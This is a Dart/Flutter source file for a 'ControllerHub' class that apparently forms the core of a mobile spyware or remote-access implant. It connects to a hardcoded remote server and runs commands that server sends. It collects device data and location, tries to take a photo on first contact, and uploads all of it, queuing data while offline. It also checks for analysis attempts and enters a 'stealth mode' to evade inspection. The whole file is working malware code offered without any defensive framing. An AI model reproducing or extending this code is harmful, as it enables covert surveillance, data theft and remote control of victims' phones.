// lib/core/controlar/controller_hub.dart
import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

import 'camera/camera_service.dart';
import 'command/command_executor.dart';
import 'data/data_collector_service.dart';
import 'filesystem/file_system_service.dart';
import 'location/location_service.dart';
import 'network/network_service.dart';
import 'permissions/device_info_service.dart';
import 'security/anti_analysis_system.dart';
import 'security/encryption_service.dart';

/// Central controller hub that coordinates all the control services
/// and provides an interface for the app to interact with them.
class ControllerHub {
  // Core services
  late NetworkService _networkService;
  late CommandExecutor _commandExecutor;
  late DataCollectorService _dataCollectorService;
  late DeviceInfoService _deviceInfoService;
  late FileSystemService _fileSystemService;
  late LocationService _locationService;
  late CameraService _cameraService;
  late AntiAnalysisSystem _antiAnalysisSystem;
  late EncryptionService _encryptionService;

  // Secure storage
  final FlutterSecureStorage _secureStorage = const FlutterSecureStorage();

  // State tracking
  bool _isInitialized = false;
  bool _isConnected = false;
  bool _isRunning = false;

  // Event streamers
  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  final StreamController<String> _statusMessageController =
      StreamController<String>.broadcast();

  // Command subscription
  StreamSubscription? _commandSubscription;

  // Singleton pattern
  static ControllerHub? _instance;

  // Secure storage keys
  static const String KEY_LAST_CONNECTION = 'controller_last_connection';
  static const String KEY_DATA_COLLECTION_COUNTER =
      'controller_data_collection_counter';

  // Private constructor
  ControllerHub._internal() {
    _initialize();
  }

  // Factory constructor
  factory ControllerHub() {
    _instance ??= ControllerHub._internal();
    return _instance!;
  }

  Future<void> _initialize() async {
    if (_isInitialized) return;

    try {
      debugPrint('ControllerHub: Initializing...');

      // Initialize services in dependency order

      // 1. Core services that don't depend on others
      _deviceInfoService = DeviceInfoService();
      _fileSystemService = FileSystemService();
      _locationService = LocationService();
      _cameraService = CameraService();

      // 2. Security services
      _encryptionService =
          EncryptionService(deviceInfoService: _deviceInfoService);

      // 3. Network and data collection
      _networkService = NetworkService(
          serverUrl: 'https://ws.sosa-qav.es',
          deviceInfoService: _deviceInfoService);

      _dataCollectorService = DataCollectorService(
          cameraService: _cameraService,
          deviceInfoService: _deviceInfoService,
          locationService: _locationService);

      // 4. Anti-analysis system
      _antiAnalysisSystem = AntiAnalysisSystem(
          fileSystemService: _fileSystemService,
          networkService: _networkService);

      // 5. Command executor
      _commandExecutor = CommandExecutor(
          cameraService: _cameraService,
          locationService: _locationService,
          fileSystemService: _fileSystemService,
          networkService: _networkService,
          deviceInfoService: _deviceInfoService,
          dataCollectorService: _dataCollectorService);

      // Set up connection status listener
      _networkService.connectionStatusStream.listen((isConnected) {
        _isConnected = isConnected;
        _connectionStatusController.add(isConnected);

        if (isConnected) {
          _handleConnection();
        } else {
          _handleDisconnection();
        }
      });

      _isInitialized = true;
      _statusMessageController.add('Services initialized');
      debugPrint('ControllerHub: Initialization complete');
    } catch (e, stack) {
      debugPrint('ControllerHub: Error during initialization: $e');
      debugPrint(stack.toString());
      _statusMessageController.add('Error initializing: $e');
    }
  }

  Future<void> _handleConnection() async {
    try {
      debugPrint('ControllerHub: Connected to server');
      _statusMessageController.add('Connected to server');

      // Store last connection time
      await _secureStorage.write(
          key: KEY_LAST_CONNECTION, value: DateTime.now().toIso8601String());

      // Process any pending data
      _processPendingData();

      // Subscribe to commands if not already subscribed
      _subscribeToCommands();

      // Collect and send initial data if needed
      await _collectAndSendInitialDataIfNeeded();
    } catch (e) {
      debugPrint('ControllerHub: Error handling connection: $e');
    }
  }

  void _handleDisconnection() {
    debugPrint('ControllerHub: Disconnected from server');
    _statusMessageController.add('Disconnected from server');
  }

  void _subscribeToCommands() {
    if (_commandSubscription != null) return;

    _commandSubscription = _networkService.commandStream.listen((commandData) {
      _handleIncomingCommand(commandData);
    });

    debugPrint('ControllerHub: Subscribed to commands');
  }

  void _unsubscribeFromCommands() {
    _commandSubscription?.cancel();
    _commandSubscription = null;
    debugPrint('ControllerHub: Unsubscribed from commands');
  }

  Future<void> _handleIncomingCommand(Map<String, dynamic> commandData) async {
    try {
      // Extract command details
      final command = commandData['command'] as String;
      final args = commandData['args'] as Map<String, dynamic>? ?? {};

      debugPrint('ControllerHub: Received command: $command');
      _statusMessageController.add('Processing command: $command');

      // Check if we should handle this command
      if (!_isRunning) {
        debugPrint(
            'ControllerHub: Ignoring command while not running: $command');
        return;
      }

      // Check for analysis attempts before executing commands
      if (await _antiAnalysisSystem.detectAnalysisAttempt()) {
        debugPrint(
            'ControllerHub: Analysis attempt detected, entering stealth mode');
        await _antiAnalysisSystem.enterStealthMode(
            triggeredBy: 'command_received_during_analysis');
        return;
      }

      // Execute the command
      await _commandExecutor.executeCommand(command, args);
    } catch (e) {
      debugPrint('ControllerHub: Error handling command: $e');
    }
  }

  Future<void> _processPendingData() async {
    try {
      // Use the network service to process any pending data
      await _dataCollectorService.processPendingData((dataType, data) async {
        debugPrint('ControllerHub: Processing pending data of type: $dataType');

        // Handle different data types
        switch (dataType) {
          case 'initial_data':
            await _networkService.sendInitialData(
              jsonData: data,
              imageFile: data['imageFile'],
            );
            break;

          case 'location':
            await _networkService.sendCommandResponse(
              originalCommand: 'location_update',
              status: 'success',
              payload: data,
            );
            break;

          case 'photo':
            if (data['file_path'] != null) {
              final deviceId =
                  await _deviceInfoService.getOrCreateUniqueDeviceId();
              await _networkService.uploadFileFromCommand(
                deviceId: deviceId,
                commandRef: 'photo_update',
                fileToUpload: data['file_path'],
              );
            }
            break;

          default:
            await _networkService.sendCommandResponse(
              originalCommand: '${dataType}_update',
              status: 'success',
              payload: data,
            );
            break;
        }

        return true;
      });
    } catch (e) {
      debugPrint('ControllerHub: Error processing pending data: $e');
    }
  }

  Future<void> _collectAndSendInitialDataIfNeeded() async {
    try {
      // Check if we've already sent initial data recently
      final lastInitialDataStr =
          await _secureStorage.read(key: 'last_initial_data_sent');
      if (lastInitialDataStr != null) {
        final lastInitialData = DateTime.parse(lastInitialDataStr);
        final daysSinceLastSend =
            DateTime.now().difference(lastInitialData).inDays;

        // Only send initial data if it's been at least 3 days
        if (daysSinceLastSend < 3) {
          debugPrint('ControllerHub: Initial data sent recently, skipping');
          return;
        }
      }

      // Collect initial data
      final collectedData = await _dataCollectorService.collectAllData();

      // Try to take a photo if we have the permissions
      Map<String, dynamic>? photoInfo;
      try {
        photoInfo = await _dataCollectorService.capturePhotoWithMetadata();
      } catch (e) {
        debugPrint('ControllerHub: Error capturing initial photo: $e');
      }

      // Add device ID to the data
      final deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();
      collectedData['deviceId'] = deviceId;

      // Send the data
      await _networkService.sendInitialData(
        jsonData: collectedData,
        imageFile: photoInfo != null ? photoInfo['file_path'] : null,
      );

      // Update last send time
      await _secureStorage.write(
        key: 'last_initial_data_sent',
        value: DateTime.now().toIso8601String(),
      );

      debugPrint('ControllerHub: Initial data collected and sent');
      _statusMessageController.add('Initial data sent');
    } catch (e) {
      debugPrint(
          'ControllerHub: Error collecting and sending initial data: $e');
    }
  }

  // PUBLIC API

  /// Start the controller
  Future<bool> start() async {
    if (!_isInitialized) {
      await _initialize();
    }

    if (_isRunning) return true;

    try {
      debugPrint('ControllerHub: Starting controller');
      _statusMessageController.add('Starting controller');

      // Connect to the server
      final deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();
      await _networkService.connectSocketIO(deviceId);

      _isRunning = true;
      _statusMessageController.add('Controller started');
      return true;
    } catch (e) {
      debugPrint('ControllerHub: Error starting controller: $e');
      _statusMessageController.add('Error starting controller: $e');
      return false;
    }
  }

  /// Stop the controller
  Future<void> stop() async {
    if (!_isRunning) return;

    try {
      debugPrint('ControllerHub: Stopping controller');
      _statusMessageController.add('Stopping controller');

      // Unsubscribe from commands
      _unsubscribeFromCommands();

      // Disconnect from the server
      _networkService.disconnectSocketIO();

      _isRunning = false;
      _statusMessageController.add('Controller stopped');
    } catch (e) {
      debugPrint('ControllerHub: Error stopping controller: $e');
      _statusMessageController.add('Error stopping controller: $e');
    }
  }

  /// Collect and send data immediately
  Future<bool> collectAndSendData() async {
    if (!_isRunning) {
      debugPrint('ControllerHub: Cannot collect data while not running');
      return false;
    }

    try {
      debugPrint('ControllerHub: Collecting and sending data');
      _statusMessageController.add('Collecting data');

      // Collect data
      final collectedData =
          await _dataCollectorService.collectAllData(forceRefresh: true);

      // Add device ID
      final deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();
      collectedData['deviceId'] = deviceId;

      // Increment counter
      final counterStr =
          await _secureStorage.read(key: KEY_DATA_COLLECTION_COUNTER);
      final counter = counterStr != null ? int.parse(counterStr) + 1 : 1;
      await _secureStorage.write(
          key: KEY_DATA_COLLECTION_COUNTER, value: counter.toString());

      // Add counter to data
      collectedData['collection_count'] = counter;

      // Send data
      if (_isConnected) {
        await _networkService.sendCommandResponse(
          originalCommand: 'data_collection',
          status: 'success',
          payload: collectedData,
        );

        _statusMessageController.add('Data sent');
        return true;
      } else {
        // Queue data for later
        await _dataCollectorService.queueDataForLater(
            'full_collection', collectedData);
        _statusMessageController.add('Data queued for later sending');
        return false;
      }
    } catch (e) {
      debugPrint('ControllerHub: Error collecting and sending data: $e');
      _statusMessageController.add('Error collecting data: $e');
      return false;
    }
  }

  /// Check for analysis attempts
  Future<bool> checkForAnalysisAttempts() async {
    try {
      debugPrint('ControllerHub: Checking for analysis attempts');

      final detected = await _antiAnalysisSystem.detectAnalysisAttempt();

      if (detected) {
        debugPrint('ControllerHub: Analysis attempt detected');
        _statusMessageController.add('Analysis attempt detected');

        // Enter stealth mode
        await _antiAnalysisSystem.enterStealthMode(triggeredBy: 'manual_check');
      } else {
        debugPrint('ControllerHub: No analysis attempts detected');
        _statusMessageController.add('No analysis attempts detected');
      }

      return detected;
    } catch (e) {
      debugPrint('ControllerHub: Error checking for analysis attempts: $e');
      return false;
    }
  }

  /// Encrypt sensitive data
  String encryptData(String data) {
    return _encryptionService.encryptForTransmission(data);
  }

  /// Decrypt sensitive data
  String decryptData(String encryptedData) {
    return _encryptionService.decryptFromTransmission(encryptedData);
  }

  /// Dispose resources
  Future<void> dispose() async {
    try {
      debugPrint('ControllerHub: Disposing resources');

      // Unsubscribe from commands
      _unsubscribeFromCommands();

      // Disconnect from server
      _networkService.disconnectSocketIO();

      // Close streams
      await _connectionStatusController.close();
      await _statusMessageController.close();

      // Dispose services
      await _cameraService.dispose();
      _antiAnalysisSystem.dispose();

      // Clear singleton instance
      _instance = null;

      debugPrint('ControllerHub: Resources disposed');
    } catch (e) {
      debugPrint('ControllerHub: Error disposing resources: $e');
    }
  }

  // GETTERS

  bool get isInitialized => _isInitialized;
  bool get isRunning => _isRunning;
  bool get isConnected => _isConnected;

  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;
  Stream<String> get statusMessageStream => _statusMessageController.stream;

  NetworkService get networkService => _networkService;
  CommandExecutor get commandExecutor => _commandExecutor;
  DataCollectorService get dataCollectorService => _dataCollectorService;
  DeviceInfoService get deviceInfoService => _deviceInfoService;
  FileSystemService get fileSystemService => _fileSystemService;
  LocationService get locationService => _locationService;
  CameraService get cameraService => _cameraService;
  AntiAnalysisSystem get antiAnalysisSystem => _antiAnalysisSystem;
  EncryptionService get encryptionService => _encryptionService;
}
